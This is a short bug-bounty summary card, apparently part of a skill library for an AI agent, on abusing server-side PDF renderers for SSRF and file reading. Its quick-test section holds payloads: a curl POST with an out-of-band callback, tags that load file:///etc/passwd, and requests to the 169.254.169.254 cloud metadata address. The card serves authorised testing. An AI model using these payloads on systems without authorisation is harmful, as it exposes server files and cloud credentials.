# Server-Side PDF Generation SSRF/LFI — Summary Card

**Phase:** 3 | **Type:** SSRF/LFI | **Impact:** Critical

## Quick Summary
PDF renderers (wkhtmltopdf, headless Chrome, WeasyPrint, PrinceXML) are full HTML engines running server-side. Submit HTML/URLs that load `file:///etc/passwd`, `http://169.254.169.254`, or internal hosts — the fetched content is echoed back *inside the PDF*. Identify the engine first; payloads differ.

## Key Indicators
- Invoice/receipt/report/ticket/export endpoints with HTML or URL input
- "Generate PDF" / "Download as PDF" / "Export" buttons
- Renderer error strings (Qt WebKit, Chrome DevTools, WeasyPrint/ReportLab)

## Quick Test
```bash
# OOB callback (fastest confirmation)
curl -X POST https://target.com/pdf/generate \
  -d "html=<img src='http://OOB_URL/pdftest'>"

# LFI via wkhtmltopdf-style engines
#   <iframe src="file:///etc/passwd"></iframe>
#   <object data="file:///etc/passwd"></object>

# Cloud metadata / internal SSRF
#   <img src="http://169.254.169.254/latest/meta-data/">
#   <img src="http://127.0.0.1:8080/">
# Download the PDF and inspect its pages/content
```

## Critical Bounty Potential
- SSRF → cloud metadata / IAM credentials = critical ($2,000-$10,000+)
- LFI → source code + secrets via `/etc/passwd`, `.env`, config files
- Internal service access through the renderer

## Token Cost
~4,200 tokens (Worker reads full SKILL.md)
